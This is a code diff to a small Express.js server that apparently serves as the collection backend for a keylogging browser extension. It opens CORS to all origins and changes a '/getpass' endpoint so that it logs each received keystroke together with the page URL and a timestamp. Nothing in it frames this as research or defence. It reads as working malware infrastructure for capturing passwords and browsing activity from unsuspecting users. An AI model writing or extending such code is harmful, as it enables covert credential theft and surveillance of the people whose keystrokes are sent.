@@ -1,8 +1,10 @@
 const express = require('express');
+const cors = require('cors');
 const app = express();
 const port = 3000;
 
 // Middleware to parse JSON request bodies
+app.use(cors()); // Allow all origins
 app.use(express.json());
 
 // Define a GET route for the root URL
@@ -12,8 +14,8 @@ app.get('/', (req, res) => {
 
 // Endpoint to handle keystroke data
 app.post('/getpass', (req, res) => {
-  const { key, timestamp } = req.body;
-  console.log(`Keystroke: ${key}, Timestamp: ${timestamp}`);
+  const { key, url, timestamp } = req.body;
+  console.log(`Keystroke: ${key}, URL: ${url}, Timestamp: ${timestamp}`);
   res.sendStatus(200); // Respond to the extension with a success status
 });
 
